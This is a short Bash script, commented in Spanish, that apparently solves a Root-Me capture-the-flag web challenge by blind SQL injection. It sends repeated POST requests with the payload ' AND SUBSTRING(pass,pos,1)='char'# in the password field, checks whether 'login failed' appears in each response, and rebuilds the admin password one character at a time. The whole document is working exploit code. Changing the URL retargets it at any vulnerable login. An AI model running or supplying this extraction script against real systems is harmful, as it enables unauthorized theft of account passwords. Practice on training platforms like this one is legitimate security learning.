#!/bin/bash

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[+] Extrayendo contraseña del admin...${NC}"

PASSWORD=""
# Caracteres más comunes en contraseñas
CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*"

for pos in {1..20}; do
    for ((i=0; i<${#CHARS}; i++)); do
        char="${CHARS:$i:1}"
        
        # Probar el carácter
        response=$(curl -s -X POST "$URL" \
            -d "username=admin&password=' AND SUBSTRING(pass,$pos,1)='$char'#" \
            | grep -c "login failed")
        
        # Si NO hay "login failed", el carácter es correcto
        if [ "$response" -eq 0 ]; then
            PASSWORD="${PASSWORD}${char}"
            echo -e "${GREEN}[✓] Posición $pos: '$char'${NC}"
            break
        fi
    done
    
    # Si no encontramos carácter, terminar
    if [ ${#PASSWORD} -lt $pos ]; then
        echo -e "${YELLOW}[!] Fin de la contraseña en posición $pos${NC}"
        break
    fi
done

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}  CONTRASEÑA: $PASSWORD${NC}"
echo -e "${GREEN}========================================${NC}"
